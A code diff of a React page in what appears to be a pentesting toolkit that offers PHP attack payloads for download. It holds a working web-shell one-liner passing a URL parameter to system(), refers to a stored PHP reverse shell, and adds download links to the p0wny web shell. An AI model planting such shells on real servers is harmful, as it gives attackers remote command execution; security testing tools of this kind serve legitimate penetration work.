@@ -36,9 +36,6 @@ export default (props) => {
   const successInfoReverseShell = () => {
     message.success("Your reverse shell has been copied");
   };
-  const successInfoDownload = () => {
-    message.success("Reverse shell URI encoded has been copied");
-  };
   const oneLiner = `<?php system($_GET["cmd"]);?`;
   const phpReverseShell = `
   <?php
@@ -238,25 +235,34 @@ export default (props) => {
           port.
         </Paragraph>
         <Collapse defaultActiveKey={["0"]}>
-          <Panel header='You can see the source code there' key='1'>
+          <Panel header='View the souce code' key='1'>
             <p>{phpReverseShell}</p>
-            <a
-              href='https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php'
-              alt='github_repo'
-              target='_blank'
-              rel='noreferrer noopener'
-            >
-              <Button type='dashed' style={{ marginBottom: 10, marginTop: 15 }}>
+            <Button type='dashed' style={{ marginBottom: 10, marginTop: 15 }}>
+              <a
+                href='https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php'
+                alt='github_repo'
+                target='_blank'
+                rel='noreferrer noopener'
+              >
                 <ArrowsAltOutlined />
                 See the github repo of the author
-              </Button>
-            </a>
+              </a>
+            </Button>
           </Panel>
         </Collapse>
         <Button
           type='primary'
           style={{ marginBottom: 10, marginTop: 15 }}
-          onClick={successInfoReverseShell}
+          onClick={() => {
+            const element = document.createElement("a");
+            const file = new Blob([phpReverseShell], {
+              type: "text/plain",
+            });
+            element.href = URL.createObjectURL(file);
+            element.download = "reverseShell.php";
+            document.body.appendChild(element);
+            element.click();
+          }}
         >
           <DownloadOutlined />
           Download
@@ -289,7 +295,16 @@ export default (props) => {
         <Button
           type='primary'
           style={{ marginBottom: 10, marginTop: 15 }}
-          onClick={successInfoReverseShell}
+          onClick={() => {
+            const element = document.createElement("a");
+            const file = new Blob([oneLiner], {
+              type: "text/plain",
+            });
+            element.href = URL.createObjectURL(file);
+            element.download = "basicRCE.php";
+            document.body.appendChild(element);
+            element.click();
+          }}
         >
           <DownloadOutlined />
           Download
@@ -306,6 +321,52 @@ export default (props) => {
         </Clipboard>
       </div>
       <Divider dashed />
+      <div
+        key='c'
+        style={{
+          padding: 15,
+          marginTop: 15,
+        }}
+      >
+        <Title>Web shell</Title>
+        <Paragraph>
+          p0wny@shell:~# is a very basic, single-file, PHP shell. It can be used
+          to quickly execute commands on a server when pentesting a PHP
+          application.
+        </Paragraph>
+        <Collapse defaultActiveKey={["0"]}>
+          <Panel header='Watch the preview' key='1'>
+            <img
+              src='https://i.imgur.com/ALPFDj0.png'
+              alt='pownyShell'
+              style={{ height: "100%", width: "100%" }}
+            />
+          </Panel>
+        </Collapse>
+        <Button type='primary' style={{ marginBottom: 10, marginTop: 15 }}>
+          <a
+            href='https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php'
+            target='_blank'
+            rel='noopener noreferrer'
+          >
+            <DownloadOutlined />
+            Download
+          </a>
+        </Button>
+        <Button
+          type='dashed'
+          style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
+        >
+          <a
+            href='https://github.com/flozz/p0wny-shell'
+            target='_blank'
+            rel='noopener noreferrer'
+          >
+            <ArrowsAltOutlined />
+            See the repo of the author
+          </a>
+        </Button>
+      </div>
     </QueueAnim>
   );
 };
